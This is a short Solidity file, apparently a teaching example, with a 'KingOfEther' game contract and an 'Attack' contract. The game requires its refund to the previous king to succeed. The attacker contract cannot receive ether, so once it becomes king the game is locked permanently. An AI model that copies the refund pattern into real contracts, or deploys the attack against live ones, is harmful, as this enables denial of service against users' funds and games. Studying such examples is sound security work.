// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEther {
    address public king;
    uint public bounty;

    function becomeKing() public payable {
        require(bounty < msg.value, "Not strong enough");

        (bool ok, ) = king.call{value:bounty}("");
        require(ok, "failed to send change");

        king = msg.sender;
        bounty = msg.value;
    }
}

contract Attack {
    KingOfEther kingofether;

    constructor(address _kingContract) {
        kingofether = KingOfEther(_kingContract);
    }

    function becomeKingForever() public payable {
        kingofether.becomeKing{value:msg.value}();
    }
}